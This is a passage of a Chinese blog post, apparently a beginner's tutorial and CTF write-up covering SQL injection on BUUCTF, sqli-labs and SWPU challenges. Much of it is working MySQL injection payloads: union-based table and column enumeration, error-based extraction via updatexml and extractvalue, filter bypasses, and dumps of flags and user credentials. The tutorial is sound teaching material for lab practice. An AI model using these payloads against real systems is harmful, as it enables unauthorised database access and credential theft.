@@ -1,0 +1,468 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>快速入门web-sql注入及buuctf西电题解 | 24kmagic</title><meta name="author" content="qyt"><meta name="copyright" content="qyt"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="快速入门web-sql注入及buuctf西电题解08 第八章 天衍真言，星图显圣 题解1.判断字段数order by 2 2.判断回显位 ‘union select  1,2# Welcome 1 3.数据库名 ‘union select database()# Welcome user 4.尝试查询数据库名为user下的所有表名 ‘union select group_concat(table_">
+<meta property="og:type" content="article">
+<meta property="og:title" content="快速入门web-sql注入及buuctf西电题解">
+<meta property="og:url" content="https://2829750658t-svg.github.io/posts/34028938.html">
+<meta property="og:site_name" content="24kmagic">
+<meta property="og:description" content="快速入门web-sql注入及buuctf西电题解08 第八章 天衍真言，星图显圣 题解1.判断字段数order by 2 2.判断回显位 ‘union select  1,2# Welcome 1 3.数据库名 ‘union select database()# Welcome user 4.尝试查询数据库名为user下的所有表名 ‘union select group_concat(table_">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://2829750658t-svg.github.io/img/butterfly-icon.png">
+<meta property="article:published_time" content="2026-03-07T07:00:28.000Z">
+<meta property="article:modified_time" content="2026-03-07T08:22:29.518Z">
+<meta property="article:author" content="qyt">
+<meta property="article:tag" content="CTF">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://2829750658t-svg.github.io/img/butterfly-icon.png"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "快速入门web-sql注入及buuctf西电题解",
+  "url": "https://2829750658t-svg.github.io/posts/34028938.html",
+  "image": "https://2829750658t-svg.github.io/img/butterfly-icon.png",
+  "datePublished": "2026-03-07T07:00:28.000Z",
+  "dateModified": "2026-03-07T08:22:29.518Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "qyt",
+      "url": "https://2829750658t-svg.github.io"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/images/favicon.png"><link rel="canonical" href="https://2829750658t-svg.github.io/posts/34028938.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.3"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":500,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '快速入门web-sql注入及buuctf西电题解',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><meta name="google-site-verification" content="xcoxCJdnrLSrFpybmYmk6WSRqz-H1rnZB7BKSjdkWD0" /><meta name="google-site-verification" content="H8Bhbw_EXOKyVq27SUdcn_avXaVqBOWzs2lPJV_HSVw" /><meta name="generator" content="Hexo 8.1.1"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/butterfly-icon.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">87</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">26</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">20</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg fixed" id="page-header" style="background-image: url(/images/bj2.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">24kmagic</span></a><a class="nav-page-title" href="/"><span class="site-name">快速入门web-sql注入及buuctf西电题解</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> 关于我</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">快速入门web-sql注入及buuctf西电题解</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2026-03-07T07:00:28.000Z" title="发表于 2026-03-07 15:00:28">2026-03-07</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2026-03-07T08:22:29.518Z" title="更新于 2026-03-07 16:22:29">2026-03-07</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/web/">web</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="快速入门web-sql注入及buuctf西电题解"><a href="#快速入门web-sql注入及buuctf西电题解" class="headerlink" title="快速入门web-sql注入及buuctf西电题解"></a>快速入门web-sql注入及buuctf西电题解</h1><h2 id="08-第八章-天衍真言，星图显圣-题解"><a href="#08-第八章-天衍真言，星图显圣-题解" class="headerlink" title="08 第八章 天衍真言，星图显圣 题解"></a>08 第八章 天衍真言，星图显圣 题解</h2><p>1.判断字段数order by 2</p>
+<p>2.判断回显位</p>
+<p>‘union select  1,2#</p>
+<p>Welcome 1</p>
+<p>3.数据库名</p>
+<p>‘union select database()#</p>
+<p>Welcome user</p>
+<p>4.尝试查询数据库名为user下的所有表名</p>
+<p>‘union select group_concat(table_name),2 from information_schema.tables where table_schema&#x3D;’user’#</p>
+<p>Welcome flag,users</p>
+<p>5.尝试查询 数据库名为user，表名为flag 下的所有列名</p>
+<p>‘union select group_concat(column_name),2 from information_schema.columns where table_schema&#x3D;’user’ and table_name&#x3D;’flag’#</p>
+<p>Welcome value</p>
+<p>6.查找数据</p>
+<p>错误答案：’union select value,2 from flag#   &#x2F;&#x2F;忘记加数据库名了</p>
+<p>‘union select value,2 from user.flag#</p>
+<h2 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p><strong>第一关：寻找注入点</strong></p>
+<p>username&#x3D;1’&amp;password&#x3D;1</p>
+<p>报错显示表明：字符型注入</p>
+<p><img src="/images/image-20260122150134815.png"></p>
+<p>username&#x3D;1’ #&amp;password&#x3D;1</p>
+<p>有过滤，可能是空格？</p>
+<p><img src="/images/image-2170920260122145229.png"></p>
+<p>去掉空格还是被过滤，可能是其他啥被过滤了</p>
+<p>username&#x3D;1 #&amp;password&#x3D;1</p>
+<p><img src="/images/image-20260122145442784.png"></p>
+<p>查询列被过滤</p>
+<p><img src="/images/image-20260122145850956.png"></p>
+<p>后面了查询字段被过滤，双写也被过滤</p>
+<p>自然正常的回显我们没办法拿到，那我们就试试不正常的——报错注入</p>
+<p><strong>第二关：报错注入</strong></p>
+<p>用 <code>updatexml()</code> 或 <code>extractvalue()</code> 函数即可</p>
+<p>举例：updatexml()</p>
+<p>1.寻找数据库名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1&#x27;or(updatexml(1%2cconcat(0x7e%2cdatabase()%2c0x7e)%2c1))%23&amp;password=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/image-20260122154125194.png"></p>
+<h3 id="问题："><a href="#问题：" class="headerlink" title="问题："></a>问题：</h3><h5 id="1-报错注入为什么不需要-UNION-SELECT？"><a href="#1-报错注入为什么不需要-UNION-SELECT？" class="headerlink" title="1. 报错注入为什么不需要 UNION SELECT？"></a>1. 报错注入为什么不需要 <code>UNION SELECT</code>？</h5><ul>
+<li><strong>Union 注入</strong>：它需要网页本身有一个专门展示查询结果的“框”（回显位），数据才能印在框里。</li>
+<li><strong>报错注入</strong>：不需要原网页有任何“框”。它利用系统的<strong>错误日志回显机制</strong>。当数据库运行出错且后端代码没有关闭错误显示时，数据库会将错误描述直接打印。</li>
+</ul>
+<h5 id="2-注入中为什么用-or-而不是-and？"><a href="#2-注入中为什么用-or-而不是-and？" class="headerlink" title="2. 注入中为什么用 or 而不是 and？"></a>2. 注入中为什么用 <code>or</code> 而不是 <code>and</code>？</h5><p>在 SQL 逻辑中</p>
+<ul>
+<li><p><strong><code>and</code> 的局限性</strong>： <code>and</code> 要求左右两边的条件都为真。</p>
+<p>如果后端 SQL 是 <code>WHERE username=&#39;admin&#39; AND password=&#39;...&#39;</code>，你注入 <code>admin&#39; and [报错函数]#</code>，只有当 <code>admin</code> 这个用户确实存在时，数据库才会去执行后面的报错函数。如果用户名猜错了，整条语句直接返回假，报错函数可能根本不会被触发。</p>
+</li>
+<li><p><strong><code>or</code> 的优势</strong>： <code>or</code> 只要有一边为真，逻辑就成立。</p>
+</li>
+</ul>
+<p>2.找表名</p>
+<p>传统的”&#x3D;“被过滤，可以用 where table_schema like database</p>
+<p><img src="/images/image-20260122160435978.png"></p>
+<p>构造：where(table_schema)like(database())</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?username=1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database())),0x7e),1))#&amp;password=1</span><br><span class="line"></span><br><span class="line">-&gt;</span><br><span class="line">?username=1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))#&amp;password=1</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得到：XPATH syntax error: ‘<del>H4rDsq1</del>‘</p>
+<p><img src="/images/image-20260122160857136.png"></p>
+<p>3.找列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">username=1&#x27;or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like(&#x27;h4rdsq1&#x27;)),0x7e),1))#&amp;password=1</span><br><span class="line"></span><br><span class="line">注意这里like(&#x27;h4rdsq1&#x27;)要加引号：明确名字和数据的区别</span><br><span class="line">涉及=就涉及值，如果不加会被当作另一个名字，那谁是h4rdsq1的值呢？</span><br><span class="line">前面的database()不用加是因为他本身是个函数。</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<p><img src="/images/image-20260122161315341.png"></p>
+<p>4.找数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1&#x27;or(updatexml(1%2cconcat(0x7e%2c(select(group_concat(id,username,password))from(H4rDsq1))%2c0x7e)%2c1))%23&amp;password=1</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/image-20260122163256229.png"></p>
+<p>去掉id，username，发现不够长，因为<code>updatexml</code> 的 <strong>32 字符限制</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username=1&#x27;or(updatexml(1%2cconcat(0x7e%2c(select(group_concat(password))from(H4rDsq1))%2c0x7e)%2c1))%23&amp;password=1</span><br><span class="line"></span><br><span class="line">XPATH syntax error: &#x27;~flag&#123;d43011cb-4890-4bfe-86bb-6f&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/image-20260122163334796.png"></p>
+<p>用right找剩下的部分（从右到左多少位）</p>
+<h3 id="right-函数的语法"><a href="#right-函数的语法" class="headerlink" title="right() 函数的语法"></a><code>right()</code> 函数的语法</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">right(字符串, 长度)</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">username=1&#x27;or(updatexml(1%2cconcat(0x7e%2c(select(group_concat(right(password,30)))from(H4rDsq1))%2c0x7e)%2c1))%23&amp;password=1</span><br><span class="line"></span><br><span class="line">XPATH syntax error: &#x27;~b-4890-4bfe-86bb-6f43edc9a887&#125;~&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>得到</p>
+<p><img src="/images/image-20260122163813994.png"></p>
+<p>拼接：’flag{d43011cb-4890-4bfe-86bb-6f43edc9a887}’</p>
+<p>注意：整个过程中，千万别把&amp;编码，因为：</p>
+<p>当你写 <code>&amp;password=1</code> 时，浏览器知道 <code>password</code> 是第二个参数。</p>
+<p>当你写 <code>%26password%3d1</code> 时，服务器会认为 <code>%26</code> 只是 <code>username</code> 参数内容的一部分。</p>
+<h3 id="举例extractvalue"><a href="#举例extractvalue" class="headerlink" title="举例extractvalue()"></a>举例extractvalue()</h3><h3 id="1-extractvalue-函数结构"><a href="#1-extractvalue-函数结构" class="headerlink" title="1. extractvalue() 函数结构"></a>1. <code>extractvalue()</code> 函数结构</h3><p><code>extractvalue(xml_frag, xpath_expr)</code> 两个参数：</p>
+<ul>
+<li><strong>第一个参数</strong>：XML 碎片的名称（可以随便填，通常填 <code>1</code>）。</li>
+<li><strong>第二个参数</strong>：XPath 表达式。如果这个表达式语法错误，MySQL 就会把错误信息连同你执行的结果一起弹出来。</li>
+</ul>
+<hr>
+<h3 id="2-构造-Payload-的逻辑"><a href="#2-构造-Payload-的逻辑" class="headerlink" title="2. 构造 Payload 的逻辑"></a>2. 构造 Payload 的逻辑</h3><p>与之前一样，我们利用 <code>concat()</code> 在查询结果前后加上波浪号 <code>~</code>。因为波浪号不是合法的 XPath 字符，所以会导致报错。</p>
+<p><strong>获取前半段的 Payload：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1&#x27;or(extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e)))%23&amp;password=1</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="3-应对-32-位限制（翻页读取）"><a href="#3-应对-32-位限制（翻页读取）" class="headerlink" title="3. 应对 32 位限制（翻页读取）"></a>3. 应对 32 位限制（翻页读取）</h3><p><code>extractvalue()</code> 同样有 <strong>32 个字符</strong> 的报错显示限制。因此，我们也需要配合 <code>mid()</code> 函数来读取 Flag 的不同部分。</p>
+<p><strong>读取第 1 到 31 位：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1&#x27;or(extractvalue(1,concat(0x7e,(select(mid(group_concat(password),1,31))from(H4rDsq1)),0x7e)))%23&amp;password=1</span><br></pre></td></tr></table></figure>
+
+<p><strong>读取第 32 到 62 位：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=1&#x27;or(extractvalue(1,concat(0x7e,(select(mid(group_concat(password),32,31))from(H4rDsq1)),0x7e)))%23&amp;password=1</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h3 id="4-updatexml-vs-extractvalue-的区别"><a href="#4-updatexml-vs-extractvalue-的区别" class="headerlink" title="4. updatexml() vs extractvalue() 的区别"></a>4. <code>updatexml()</code> vs <code>extractvalue()</code> 的区别</h3><table>
+<thead>
+<tr>
+<th><strong>特性</strong></th>
+<th><strong>updatexml()</strong></th>
+<th><strong>extractvalue()</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong>参数个数</strong></td>
+<td>3 个</td>
+<td>2 个</td>
+</tr>
+<tr>
+<td><strong>报错长度限制</strong></td>
+<td>32 字符</td>
+<td>32 字符</td>
+</tr>
+<tr>
+<td><strong>核心原理</strong></td>
+<td>路径参数错误触发报错</td>
+<td>XPath 格式错误触发报错</td>
+</tr>
+<tr>
+<td><strong>优势</strong></td>
+<td>极其通用</td>
+<td>字符数更少，Payload 更短</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="sqli-5题解"><a href="#sqli-5题解" class="headerlink" title="sqli-5题解"></a>sqli-5题解</h2><p>对于怎样输入都没有回显位的题目，考虑[报错注入]，这样我们就可以通过报错和获取信息</p>
+<p>1.判断有无注入点 </p>
+<p>?id&#x3D;1 ?id&#x3D;1’ ，两个页面返回不一样，说明没有过滤<code>&#39;</code>,存在注入点</p>
+<p>2.判断注入类型：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">//判断字符型</span><br><span class="line">?id=1&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="line">?id=1&#x27; and &#x27;1&#x27;=&#x27;2</span><br><span class="line"></span><br><span class="line">//判断数字型      </span><br><span class="line">?id=1 and 1=1</span><br><span class="line">?id=1 and 1=2</span><br></pre></td></tr></table></figure>
+
+<p>3.判断有几个字段</p>
+<p>（为什么要判断，因为要让数据库允许你插入，就要让你自己的select列数&#x3D;原始后台select列数</p>
+<p>像这样：</p>
+<p>【原始查询】     SELECT a, b, c FROM xxx<br>【你注入的查询】 UNION SELECT x, y, z）</p>
+<p>?id&#x3D;1’ order by 3–+</p>
+<p>?id&#x3D;1’ order by 4–+</p>
+<p>4.确定回显位</p>
+<p>?id&#x3D;-1’ union select 1,2,3–+</p>
+<p>发现没有报错，也没回显，用报错注入</p>
+<p>5.报表名(必须写0x7e，~在sql语法里面是另外一种意思)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema=database()),0x7e))--+</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~emails,referers,uagents,users~&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>6.报列名</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name=&#x27;users&#x27;),0x7e))--+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: &#x27;~id,username,password~&#x27;</span><br></pre></td></tr></table></figure>
+
+<p>7.报具体数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(username,&#x27;~&#x27;,password) from users</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&#x27; and extractvalue(1,concat(0x7e,(select group_concat(username,0x7e,password) from users),0x7e))--+</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">XPATH syntax error: <span class="string">&#x27;~Dumb~Dumb,Angelina~I-kill-you,D&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<h2 id="SWPU2019-Web1"><a href="#SWPU2019-Web1" class="headerlink" title="[SWPU2019]Web1"></a>[SWPU2019]Web1</h2><h3 id="1-1"><a href="#1-1" class="headerlink" title="1"></a>1</h3><p><a target="_blank" rel="noopener" href="https://yueyejian13.github.io/ctf/tricks/web1/">https://yueyejian13.github.io/ctf/tricks/web1/</a></p>
+<p>information_schema还有or，因为or被过滤，因此也无法使用。所以这里只能采用innodb_index_stats和 mysql.innodb_table_stats来进行绕过。</p>
+<p>但是这俩都是功能性的东西，他们都无法查到列名</p>
+<table>
+<thead>
+<tr>
+<th><strong>组件名称</strong></th>
+<th><strong>角色</strong></th>
+<th><strong>记录什么？</strong></th>
+<th><strong>作用</strong></th>
+</tr>
+</thead>
+<tbody><tr>
+<td><strong><code>information_schema</code></strong></td>
+<td><strong>官方行政档案</strong></td>
+<td>仓库里所有的房间名（表）、每个房间里所有的货架名（列）、谁有权进入。</td>
+<td>首选，但常被过滤。</td>
+</tr>
+<tr>
+<td><strong><code>innodb_table_stats</code></strong></td>
+<td><strong>建筑维护记录</strong></td>
+<td>房间（表）的大小、有多少箱货物（行数）。</td>
+<td>当info库被封时，用来查表名。</td>
+</tr>
+<tr>
+<td><strong><code>innodb_index_stats</code></strong></td>
+<td><strong>物流追踪表</strong></td>
+<td>哪些货架被贴了快递单（索引）、追踪这些快递的效率。</td>
+<td><strong>找房间名+索引线索</strong>。比 table_stats 多一点索引信息。</td>
+</tr>
+</tbody></table>
+<p><img src="/images/image-2170920260126121455.png"></p>
+<p><img src="/images/image-2170920260126143530.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/1,2,group_concat(table_name),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22/**/from/**/mysql.innodb_index_stats/**/where/**/database_name=&quot;web1&quot;&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/1,2,(select/**/group_concat(bb)/**/from/**/(select/**/1,2/**/as/**/aa,3/**/as/**/bb/**/union/**/select/**/*/**/from/**/users)as/**/a),4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27; </span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/image-20260126143751776.png"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27;/**/union/**/select/**/1,database(),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22&#x27;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/images/image-20260126144012293.png"></p>
+<p><img src="/images/image-20260126145715087.png"></p>
+<p><img src="/images/image-20260126154755151.png"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://2829750658t-svg.github.io">qyt</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://2829750658t-svg.github.io/posts/34028938.html">https://2829750658t-svg.github.io/posts/34028938.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来源 <a href="https://2829750658t-svg.github.io" target="_blank">24kmagic</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a></div><div class="post-share"><div class="social-share" data-image="/img/butterfly-icon.png" data-sites="facebook,x,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/sharejs/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i>赞助</div><div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/images/wechat.jpg" target="_blank"><img class="post-qr-code-img" src="/images/wechat.jpg" alt="微信"/></a><div class="post-qr-code-desc">微信</div></li><li 